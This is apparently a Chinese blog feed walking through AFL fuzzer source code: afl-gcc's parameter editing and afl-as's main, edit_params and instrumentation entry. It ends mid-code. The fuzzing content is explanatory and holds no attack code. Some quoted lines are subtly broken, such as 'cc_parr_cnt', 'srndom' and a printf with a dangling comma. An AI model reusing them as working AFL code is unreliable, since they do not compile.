<h3 id="edit-params函数分析"><a href="#edit-params函数分析" class="headerlink" title="&lt;4&gt;.edit_params函数分析"></a>&lt;4&gt;.edit_params函数分析</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">edit_params</span><span class="params">(u32 argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  u8 fortify_set = <span class="number">0</span>, asan_set = <span class="number">0</span>;</span><br><span class="line">  u8 *name;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">  u8 m32_set = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  cc_params = ck_alloc((argc + <span class="number">128</span>) * <span class="keyword">sizeof</span>(u8*));</span><br><span class="line">  name = <span class="built_in">strrchr</span>(argv[<span class="number">0</span>], <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!name) name = argv[<span class="number">0</span>]; <span class="keyword">else</span> name++;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;afl-clang&quot;</span>, <span class="number">9</span>)) &#123;<span class="comment">//如果在命令行参数中匹配到/clang</span></span><br><span class="line">    clang_mode = <span class="number">1</span>;</span><br><span class="line">    setenv(CLANG_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-clang++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;clang++&quot;</span>; <span class="comment">//使用AFL_CXX或者clang++</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;clang&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* With GCJ and Eclipse installed, you can actually compile Java! The</span></span><br><span class="line"><span class="comment">       instrumentation will work (amazingly). Alas, unhandled exceptions do</span></span><br><span class="line"><span class="comment">       not call abort(), so afl-fuzz would need to be modified to equate</span></span><br><span class="line"><span class="comment">       non-zero exit codes with crash conditions when working with Java</span></span><br><span class="line"><span class="comment">       binaries. Meh. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> cc_params[<span class="number">0</span>] = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line">      SAYF(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line">      FATAL(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-g++&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cxx = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cxx ? alt_cxx : (u8*)<span class="string">&quot;g++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcj&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcc&quot;</span>; <span class="comment">//确定调用那个编译器</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!be_quiet) WARNF(<span class="string">&quot;-B is already set, overriding&quot;</span>); <span class="comment">//找-B参数</span></span><br><span class="line">      <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>; <span class="comment">//忽略-interated-a和-pipe</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = cur;</span><br><span class="line">  &#125;</span><br><span class="line">  cc_params[cc_parr_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = as_path;</span><br><span class="line">  <span class="keyword">if</span> (clang_mode)</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fortify_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (asan_set) &#123; <span class="comment">//添加ASAN路径</span></span><br><span class="line">    <span class="comment">/* Pass this on to afl-as to adjust map density. */</span></span><br><span class="line">    setenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      FATAL(<span class="string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="comment">/* On 64-bit FreeBSD systems, clang -g -m32 is broken, but -m32 itself</span></span><br><span class="line"><span class="comment">       works OK. This has nothing to do with us, but let&#x27;s avoid triggering</span></span><br><span class="line"><span class="comment">       that bug. */</span></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line">    <span class="comment">/* Two indicators that you&#x27;re building for fuzzing; one of them is</span></span><br><span class="line"><span class="comment">       AFL-specific, the other is shared with libfuzzer. */</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们可以看到，在<code>edit_params</code>函数中，主要做的就是检索命令行参数，然后寻找一些路径，最后拼接出新的命令。<br>而在最后，<code>execvp(cc_params[0], (char**)cc_params);</code>就是使用新命令，调用编译器。</p>
]]></content>
      <categories>
        <category>AFL源码分析</category>
      </categories>
      <tags>
        <tag>二进制漏洞挖掘</tag>
        <tag>AFL源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL源码分析【2】：afl-as</title>
    <url>/2025/02/10/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%902%E3%80%91%EF%BC%9Aafl-as/</url>
    <content><![CDATA[<p>在分析编译的源码的时候，我们发现调用的是<code>afl-as</code>，并不是原生gcc，而在<code>afl-as.c</code>中，就是完成了插桩功能：</p>
<h4 id="afl-as-h"><a href="#afl-as-h" class="headerlink" title="&lt;1&gt;.afl-as.h"></a>&lt;1&gt;.afl-as.h</h4><p>首先我们来看一下<code>afl-as.h</code>，发现其中都是一些汇编代码，猜测是用于插装或者路径信息反馈的函数，我们分析到的时候仔细看。</p>
<h4 id="afl-as-c"><a href="#afl-as-c" class="headerlink" title="&lt;2&gt;.afl-as.c"></a>&lt;2&gt;.afl-as.c</h4><h5 id="main"><a href="#main" class="headerlink" title="main"></a>main</h5><p>首先我们来看看main函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  s32 pid;</span><br><span class="line">  u32 rand_seed;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  u8* inst_ratio_str = getenv(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timezone</span> <span class="title">tz</span>;</span></span><br><span class="line">  clang_mode = !!getenv(CLANG_ENV_VAR);</span><br><span class="line">  <span class="keyword">if</span> (isatty(<span class="number">2</span>) &amp;&amp; !getenv(<span class="string">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class="line">    SAYF(cCYA <span class="string">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> be_quiet = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    SAYF(<span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This is a helper application for afl-fuzz. It is a wrapper around GNU &#x27;as&#x27;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;executed by the toolchain whenever using afl-gcc or afl-clang. You probably\n&quot;</span></span><br><span class="line">         <span class="string">&quot;don&#x27;t want to run this program directly.\n\n&quot;</span></span><br><span class="line">         <span class="string">&quot;Rarely, when dealing with extremely complex projects, it may be advisable to\n&quot;</span></span><br><span class="line">         <span class="string">&quot;set AFL_INST_RATIO to a value less than 100 in order to reduce the odds of\n&quot;</span></span><br><span class="line">         <span class="string">&quot;instrumenting every discovered branch.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  gettimeofday(&amp;tv, &amp;tz);</span><br><span class="line">  rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();</span><br><span class="line">  srndom(rand_seed);<span class="comment">//随机数获取方法</span></span><br><span class="line">  edit_params(argc, argv);  <span class="comment">/*编辑传递给as的参数*/</span></span><br><span class="line">  <span class="keyword">if</span> (inst_ratio_str) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(inst_ratio_str, <span class="string">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class="number">1</span> || inst_ratio &gt; <span class="number">100</span>)</span><br><span class="line">      FATAL(<span class="string">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (getenv(AS_LOOP_ENV_VAR))</span><br><span class="line">    FATAL(<span class="string">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class="line">  setenv(AS_LOOP_ENV_VAR, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="comment">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class="line"><span class="comment">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class="line"><span class="comment">     that... */</span></span><br><span class="line">  <span class="comment">/*在使用 ASAN 编译时，我们没有特别优雅的方式跳过与 ASAN 相关的分支。但我们可以通过概率方式来弥补这一点……*/</span></span><br><span class="line">  <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_USE_ASAN&quot;</span>) || getenv(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    sanitizer = <span class="number">1</span>;</span><br><span class="line">    inst_ratio /= <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!just_version) add_instrumentation();</span><br><span class="line">  <span class="keyword">if</span> (!(pid = fork())) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;插装完成，请查看中间文件：%s&quot;</span>,)</span><br><span class="line">    <span class="comment">//_sleep(10000)</span></span><br><span class="line">    execvp(as_params[<span class="number">0</span>], (<span class="type">char</span>**)as_params);</span><br><span class="line">    FATAL(<span class="string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt;= <span class="number">0</span>) PFATAL(<span class="string">&quot;waitpid() failed&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!getenv(<span class="string">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) unlink(modified_file);</span><br><span class="line">  <span class="built_in">exit</span>(WEXITSTATUS(status));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到在main函数中，主要调用了<code>edit_params</code>函数进行调整参数，调用了<code>add_instrumentation()</code>函数进行插桩。<br>我们来仔细看看这俩函数：</p>
<h5 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h5><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Examine and modify parameters to pass to &#x27;as&#x27;. Note that the file name</span></span><br><span class="line"><span class="comment">   is always the last parameter passed by GCC, so we exploit this property</span></span><br><span class="line"><span class="comment">   to keep the code simple. */</span></span><br><span class="line"><span class="comment">/*检查并修改传递给 as 的参数。请注意，文件名总是 GCC 传递的最后一个参数，因此我们利用这一特性来简化代码。*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">edit_params</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  u8 *tmp_dir = getenv(<span class="string">&quot;TMPDIR&quot;</span>), *afl_as = getenv(<span class="string">&quot;AFL_AS&quot;</span>); <span class="comment">//获取缓存文件夹路径和AFL_AS路径</span></span><br><span class="line">  u32 i;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">  u8 use_clang_as = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* On MacOS X, the Xcode cctool &#x27;as&#x27; driver is a bit stale and does not work</span></span><br><span class="line"><span class="comment">     with the code generated by newer versions of clang that are hand-built</span></span><br><span class="line"><span class="comment">     by the user. See the thread here: http://goo.gl/HBWDtn.</span></span><br><span class="line"><span class="comment">     To work around this, when using clang and running without AFL_AS</span></span><br><span class="line"><span class="comment">     specified, we will actually call &#x27;clang -c&#x27; instead of &#x27;as -q&#x27; to</span></span><br><span class="line"><span class="comment">     compile the assembly file.</span></span><br><span class="line"><span class="comment">     The tools aren&#x27;t cmdline-compatible, but at least for now, we can</span></span><br><span class="line"><span class="comment">     seemingly get away with this by making only very minor tweaks. Thanks</span></span><br><span class="line"><span class="comment">     to Nico Weber for the idea. */</span></span><br><span class="line">  <span class="keyword">if</span> (clang_mode &amp;&amp; !afl_as) &#123;</span><br><span class="line">    use_clang_as = <span class="number">1</span>;</span><br><span class="line">    afl_as = getenv(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = getenv(<span class="string">&quot;AFL_CXX&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!afl_as) afl_as = <span class="string">&quot;clang&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  <span class="comment">/* Although this is not documented, GCC also uses TEMP and TMP when TMPDIR</span></span><br><span class="line"><span class="comment">     is not set. We need to check these non-standard variables to properly</span></span><br><span class="line"><span class="comment">     handle the pass_thru logic later on. */</span></span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="string">&quot;TEMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = getenv(<span class="string">&quot;TMP&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!tmp_dir) tmp_dir = <span class="string">&quot;/tmp&quot;</span>;</span><br><span class="line">  as_params = ck_alloc((argc + <span class="number">32</span>) * <span class="keyword">sizeof</span>(u8*));</span><br><span class="line">  as_params[<span class="number">0</span>] = afl_as ? afl_as : (u8*)<span class="string">&quot;as&quot;</span>;</span><br><span class="line">  as_params[argc] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; argc - <span class="number">1</span>; i++) &#123; <span class="comment">//判断要编译成32位还是64位</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;--32&quot;</span>)) use_64bit = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">    <span class="comment">/* The Apple case is a bit different... */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-arch&quot;</span>) &amp;&amp; i + <span class="number">1</span> &lt; argc) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;x86_64&quot;</span>)) use_64bit = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[i + <span class="number">1</span>], <span class="string">&quot;i386&quot;</span>))</span><br><span class="line">        FATAL(<span class="string">&quot;Sorry, 32-bit Apple platforms are not supported.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Strip options that set the preference for a particular upstream</span></span><br><span class="line"><span class="comment">       assembler in Xcode. */</span></span><br><span class="line">    <span class="keyword">if</span> (clang_mode &amp;&amp; (!<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-q&quot;</span>) || !<span class="built_in">strcmp</span>(argv[i], <span class="string">&quot;-Q&quot;</span>)))</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">    as_params[as_par_cnt++] = argv[i];</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">  <span class="comment">/* When calling clang as the upstream assembler, append -c -x assembler</span></span><br><span class="line"><span class="comment">     and hope for the best. */</span></span><br><span class="line">  <span class="keyword">if</span> (use_clang_as) &#123;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;-x&quot;</span>;</span><br><span class="line">    as_params[as_par_cnt++] = <span class="string">&quot;assembler&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  input_file = argv[argc - <span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> (input_file[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(input_file + <span class="number">1</span>, <span class="string">&quot;-version&quot;</span>)) &#123;</span><br><span class="line">      just_version = <span class="number">1</span>;</span><br><span class="line">      modified_file = input_file;</span><br><span class="line">      <span class="keyword">goto</span> wrap_things_up;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (input_file[<span class="number">1</span>]) FATAL(<span class="string">&quot;Incorrect use (not called through afl-gcc?)&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span> input_file = <span class="literal">NULL</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* Check if this looks like a standard invocation as a part of an attempt</span></span><br><span class="line"><span class="comment">       to compile a program, rather than using gcc on an ad-hoc .s file in</span></span><br><span class="line"><span class="comment">       a format we may not understand. This works around an issue compiling</span></span><br><span class="line"><span class="comment">       NSS. */</span></span><br><span class="line">      <span class="comment">/*检查这是否看起来像是编译程序的一部分，而不是在我们可能无法理解的格式上，</span></span><br><span class="line"><span class="comment">      临时使用 gcc 编译 .s 文件。此方法解决了编译 NSS 时遇到的问题。</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(input_file, tmp_dir, <span class="built_in">strlen</span>(tmp_dir)) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/var/tmp/&quot;</span>, <span class="number">9</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">strncmp</span>(input_file, <span class="string">&quot;/tmp/&quot;</span>, <span class="number">5</span>)) pass_thru = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  modified_file = alloc_printf(<span class="string">&quot;%s/.afl-%u-%u.s&quot;</span>, tmp_dir, getpid(),</span><br><span class="line">                               (u32)time(<span class="literal">NULL</span>));   <span class="comment">//临时文件</span></span><br><span class="line">wrap_things_up:</span><br><span class="line">  as_params[as_par_cnt++] = modified_file;</span><br><span class="line">  as_params[as_par_cnt]   = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input file: %s&quot;</span>,input_file);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;modified_file: %s&quot;</span>,modified_file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到，edit_params函数主要的功能就是判断要生成多少位的应用程序，然后寻找tmp路径，为什么要找这个tmp路径呢？是因为在gcc汇编过程中，会生成一个.s文件，这个文件是汇编文件，存放在tmp文件夹，然后，gcc会调用汇编器as，去生成可执行文件。</p>
<h5 id="add-instrumentation"><a href="#add-instrumentation" class="headerlink" title="add_instrumentation"></a>add_instrumentation</h5><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">add_instrumentation</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">static</span> u8 line[MAX_LINE];</span><br><span class="line">  FILE* inf;</span><br><span class="line">  FILE* outf;</span><br><span class="line">  s32 outfd;</span><br><span class="line">  u32 ins_lines = <span class="number">0</span>;</span><br><span class="line">  u8  instr_ok = <span class="number">0</span>, skip_csect = <span class="number">0</span>, skip_next_label = <span class="number">0</span>,</span><br><span class="line">      skip_intel = <span class="number">0</span>, skip_app = <span class="number">0</span>, instrument_next = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line">  u8* colon_pos;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line">  <span class="keyword">if</span> (input_file) &#123;</span><br><span class="line">    inf = fopen(input_file, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span 